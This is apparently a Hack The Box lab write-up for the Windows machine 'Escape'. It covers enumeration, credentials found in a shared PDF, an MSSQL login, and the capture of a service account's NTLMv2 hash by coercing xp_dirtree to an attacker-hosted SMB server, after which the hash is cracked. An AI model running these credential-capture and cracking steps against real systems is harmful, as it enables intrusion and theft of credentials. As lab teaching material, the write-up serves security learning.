---
layout: writeup
category: HTB
date: 2024-12-29
comments: false
tags: 
---

<br />

![1](../../../assets/images/Escape/1.png)

<br />

OS -> Windows.

Difficulty -> Medium.

<br />

# Introduction:

<br />



<br />

# Enumeration:

<br />

We start by running the typical `nmap` scan to see which ports are open:

<br />

```bash
❯ nmap -p- 10.10.11.202 --open --min-rate 5000 -sS -T5 -Pn -n -sCV
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-05-02 20:12 CEST
Nmap scan report for 10.10.11.202
Host is up (0.051s latency).
Not shown: 65515 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-05-03 02:11:56Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2025-05-03T02:13:26+00:00; +7h58m14s from scanner time.
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:dc.sequel.htb, DNS:sequel.htb, DNS:sequel
| Not valid before: 2024-01-18T23:03:57
|_Not valid after:  2074-01-05T23:03:57
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2025-05-03T02:13:26+00:00; +7h58m15s from scanner time.
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:dc.sequel.htb, DNS:sequel.htb, DNS:sequel
| Not valid before: 2024-01-18T23:03:57
|_Not valid after:  2074-01-05T23:03:57
1433/tcp  open  ms-sql-s      Microsoft SQL Server 2019 15.00.2000.00; RTM
|_ms-sql-info: ERROR: Script execution failed (use -d to debug)
|_ssl-date: 2025-05-03T02:13:26+00:00; +7h58m14s from scanner time.
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Not valid before: 2025-05-03T00:42:02
|_Not valid after:  2055-05-03T00:42:02
|_ms-sql-ntlm-info: ERROR: Script execution failed (use -d to debug)
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2025-05-03T02:13:26+00:00; +7h58m14s from scanner time.
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:dc.sequel.htb, DNS:sequel.htb, DNS:sequel
| Not valid before: 2024-01-18T23:03:57
|_Not valid after:  2074-01-05T23:03:57
3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2025-05-03T02:13:26+00:00; +7h58m15s from scanner time.
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:dc.sequel.htb, DNS:sequel.htb, DNS:sequel
| Not valid before: 2024-01-18T23:03:57
|_Not valid after:  2074-01-05T23:03:57
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
9389/tcp  open  mc-nmf        .NET Message Framing
49667/tcp open  msrpc         Microsoft Windows RPC
49689/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49690/tcp open  msrpc         Microsoft Windows RPC
49713/tcp open  msrpc         Microsoft Windows RPC
49722/tcp open  msrpc         Microsoft Windows RPC
49752/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2025-05-03T02:12:47
|_  start_date: N/A
|_clock-skew: mean: 7h58m14s, deviation: 0s, median: 7h58m13s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 136.36 seconds
```

<br />

Relevant Open Ports:

- `Port 53`   -> dns  

- `Port 88`   -> kerberos  

- `Port 135`  -> rpc  

- `Port 139`  -> netbios  

- `Port 389`  -> ldap  

- `Port 445`  -> smb  

- `Port 464`  -> kpasswd (kerberos password change)  

- `Port 593`  -> rpc over http  

- `Port 636`  -> ldaps  

- `Port 1433` -> mssql  

- `Port 5985` -> winrm  

<br />

The nmap script shows in LDAP service the domain name of `sequel.htb` and the TLS certificate `dc.sequel.htb`.

So we add them to our `/etc/hosts`:

<br />

```bash
10.10.11.202 sequel.htb dc.sequel.htb
```

<br />

# TLS Certificate: Port -> 3269

<br />

Let's inspect the `TLS` certificate using `openssl` to check for any relevant information:

<br />

```bash
---
Server certificate
subject=
issuer=DC = htb, DC = sequel, CN = sequel-DC-CA
---
```

<br />

The only noteworthy detail in the output is the `CA` certificate name: `sequel-DC-CA`.

<br />

# SMB Enumeration: Port -> 445

<br />

To gather additional system information, we'll start with a classic [Crackmapexec](https://github.com/byt3bl33d3r/CrackMapExec) oneliner:

<br />

```bash
❯ crackmapexec smb 10.10.11.202
SMB         10.10.11.202    445    DC               [*] Windows 10.0 Build 17763 x64 (name:DC) (domain:sequel.htb) (signing:True) (SMBv1:False)
```

<br />

As seen in the output, the host is running  Windows 10 (Build 17763), and we confirm the domain name: `sequel.htb`

<br />

Next, we attempt a `null session` (empty password) to enumerate shared resources over `SMB`:

<br />

```bash
❯ crackmapexec smb 10.10.11.202 -u 'fakeuser' -p '' --shares
SMB         10.10.11.202    445    DC               [*] Windows 10.0 Build 17763 x64 (name:DC) (domain:sequel.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.202    445    DC               [+] sequel.htb\fakeuser: 
SMB         10.10.11.202    445    DC               [*] Enumerated shares
SMB         10.10.11.202    445    DC               Share           Permissions     Remark
SMB         10.10.11.202    445    DC               -----           -----------     ------
SMB         10.10.11.202    445    DC               ADMIN$                          Remote Admin
SMB         10.10.11.202    445    DC               C$                              Default share
SMB         10.10.11.202    445    DC               IPC$            READ            Remote IPC
SMB         10.10.11.202    445    DC               NETLOGON                        Logon server share 
SMB         10.10.11.202    445    DC               Public          READ            
SMB         10.10.11.202    445    DC               SYSVOL                          Logon server share
```

<br />

Great! The `Public` share is not a default folder, and we have `READ` access to it.

While enumerating this folder with `smbclient` we found an interesting SQL pdf:

<br />

```bash
❯ smbclient //10.10.11.202/Public -N
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Sat Nov 19 12:51:25 2022
  ..                                  D        0  Sat Nov 19 12:51:25 2022
  SQL Server Procedures.pdf           A    49551  Fri Nov 18 14:39:43 2022

		5184255 blocks of size 4096. 1465497 blocks available
smb: \> get "SQL Server Procedures.pdf"
getting file \SQL Server Procedures.pdf of size 49551 as SQL Server Procedures.pdf (177,9 KiloBytes/sec) (average 177,9 KiloBytes/sec)
```

<br />

We download the file using `get` and open it locally for further analysis:

<br />

```bash
open "SQL Server Procedures.pdf"
```

<br />

![2](../../../assets/images/Escape/2.png)

<br />

At the end of the PDF, we have discovered some potentially useful `SQL` credentials: `PublicUser:GuestUserCantWrite1`

They are mentioned in the following excerpt:

<br />

```bash
For new hired and those that are still waiting their users to be created and perms assigned, can sneak a peek at the Database with
user PublicUser and password GuestUserCantWrite1 .
Refer to the previous guidelines and make sure to switch the "Windows Authentication" to "SQL Server Authentication".
```

<br />

These credentials do not grant access to any SMB shares.

<br />

# MSSQL Enumeration: Port -> 1433

<br />

As noted earlier, the machine is hosting a `SQL Server`.

With these credentials, and using the [Impacket](https://github.com/fortra/impacket) tool `mssqlclient.py`, we can log in:

<br />

```bash
❯ mssqlclient.py PublicUser:GuestUserCantWrite1@10.10.11.202
Impacket v0.12.0.dev1+20230909.154612.3beeda7 - Copyright 2023 Fortra

[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(DC\SQLMOCK): Line 1: Changed database context to 'master'.
[*] INFO(DC\SQLMOCK): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server (150 7208) 
[!] Press help for extra shell commands
SQL (PublicUser  guest@master)> 
```

<br />

We can list four `databases` on the server (default MSSQL databases):

<br />

```bash
SQL (PublicUser  guest@master)> enum_db
name     is_trustworthy_on   
------   -----------------   
master                   0   

tempdb                   0   

model                    0   

msdb                     1
```

<br />

### xp_cmdshell:

<br />

When we are inside a MSSQL server, we can try to activate the `xp_cmdshell`.

A function that allow us to run commands into the system.

However, in this case, we don't have the necessary permissions:

<br />

```bash
SQL (PublicUser  guest@master)> enable_xp_cmdshell
[-] ERROR(DC\SQLMOCK): Line 105: User does not have permission to perform this action.
[-] ERROR(DC\SQLMOCK): Line 1: You do not have permission to run the RECONFIGURE statement.
[-] ERROR(DC\SQLMOCK): Line 62: The configuration option 'xp_cmdshell' does not exist, or it may be an advanced option.
<[-] ERROR(DC\SQLMOCK): Line 1: You do not have permission to run the RECONFIGURE statement.
```

<br />

We also tried to execute a command directly using `xp_cmdshell` without success:

<br />

```bash
SQL (PublicUser  guest@master)> xp_cmdshell whoami
[-] ERROR(DC\SQLMOCK): Line 1: The EXECUTE permission was denied on the object 'xp_cmdshell', database 'mssqlsystemresource', schema 'sys'.
```

<br />

## Get NTLMv2 Hash:

<br />

Another technique we can leverage on the MSSQL Server is the `xp_dirtree` function.

This function allows us to retrieve a `directory listing` from the file system.

What's particularly interesting is that, if we point it to a network path hosted by an `Impacket server` running on our machine, we might be able to capture the `NTLM` hash of the user executing the query on the target system.

So, first we will host the server using `impacket-server`:

<br />

```bash
❯ impacket-smbserver Folder $(pwd) -smb2support
Impacket v0.11.0 - Copyright 2023 Fortra

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
[*] Config file parsed
```

<br />

Then, we run xp_dirtree targeting our server:

<br />

```bash
SQL (PublicUser  guest@master)> xp_dirtree \\10.10.14.22\Folder
subdirectory   depth   file
------------   -----   ----
```

<br />

And check the impacket-server:

<br />

```bash
❯ impacket-smbserver Folder $(pwd) -smb2support
Impacket v0.11.0 - Copyright 2023 Fortra

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
[*] Config file parsed
[*] Incoming connection (10.10.11.202,55308)
[*] AUTHENTICATE_MESSAGE (sequel\sql_svc,DC)
[*] User DC\sql_svc authenticated successfully
[*] sql_svc::sequel:aaaaaaaaaaaaaaaa:a47f2bd3187c0730f2b6f55794322452:0101000000000000804931a638bcdb01db5166ebaa9fe9900000000001001000770067004f0049004b0052004500540003001000770067004f0049004b00520045005400020010006b00560064004500470063006c006100040010006b00560064004500470063006c00610007000800804931a638bcdb010600040002000000080030003000000000000000000000000030000029c82ea33e7042d6719019b8a652da06691eb0d187880fc1f18597c4f97d3b040a001000000000000000000000000000000000000900200063006900660073002f00310030002e00310030002e00310034002e00320032000000000000000000
[*] Closing down connection (10.10.11.202,55308)
[*] Remaining connections []
```

<br />

GG! We have a `NTLMv2` hash from the user `sql_svc`.

Let's try to crack it using `john`:

<br />

```bash
❯ john --format=netntlmv2 --wordlist=/usr/share/wordlists/rockyou.txt hash
Using default input encoding: UTF-8
Loaded 1 password hash (netntlmv2, NTLMv2 C/R [MD4 HMAC-MD5 32/64])
Will run 8 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
REGGIE1234ronnie (sql_svc)     
...[snip]...

```

<br />

We obtained new credentials: `sql_svc:REGGIE1234ronnie`

<br />
